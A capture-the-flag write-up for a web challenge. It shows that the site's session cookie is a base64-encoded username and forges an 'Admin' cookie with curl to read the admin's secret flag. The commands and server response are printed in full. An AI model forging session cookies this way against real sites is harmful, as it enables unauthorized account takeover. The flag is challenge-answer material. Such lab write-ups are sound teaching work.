**Be The Admin**  
Points: 75  
Topics: web  
  
Description  
This is a very basic website where you can view other user's profiles, but you can only see your own secret. I'll bet other users' secrets have something of interest  
http://184.72.87.9:8012

**Write-up**  
Very simple web challenge. 

The main page shows links that take to each user's "profile" page. When first requesting the server you are given a `Set-Cookie` header:


By base64 decoding it...

```
$ echo -n "Q1RGIFBhcnRpY2lwYW50" | base64 -d
CTF Participant
```
... which matches one of the profiles' name. Being the other name "Admin" what you have to do is base64 encode it...

```
$ echo -n "Admin" | base64
QWRtaW4=
```
... and replace the `Cookie: session_id` cookie header with it's value, with a little caveat: the padding char `=` must be removed so it's safe for URL enconding, according to [Wikipedia](https://en.wikipedia.org/wiki/Base64):
> Some variants allow or require omitting the padding '=' signs to avoid them being confused with field separators, or require that any such padding be percent-encoded.

```
$ curl -s 'http://184.72.87.9:8012/profile?id=2' -v -H 'Cookie: session_id="QWRtaW4"'
*   Trying 184.72.87.9:8012...
* Connected to 184.72.87.9 (184.72.87.9) port 8012 (#0)
> GET /profile?id=2 HTTP/1.1
> Host: 184.72.87.9:8012
> User-Agent: curl/7.88.1
> Accept: */*
> Cookie: session_id="QWRtaW4"
>
< HTTP/1.1 200
< Content-Type: text/html;charset=UTF-8
< Content-Language: en-US
< Transfer-Encoding: chunked
< Date: Sat, 18 Nov 2023 20:36:23 GMT
<
<!DOCTYPE HTML>
<html>
<head>
  <title>Be The Admin</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Profile</h1>
<br>
<p>Name: Admin</p>
<p>Secret: flag{boyireallyhopenobodyfindsthis!!}</p>
</body>
</html>
* Connection #0 to host 184.72.87.9 left intact
``` 
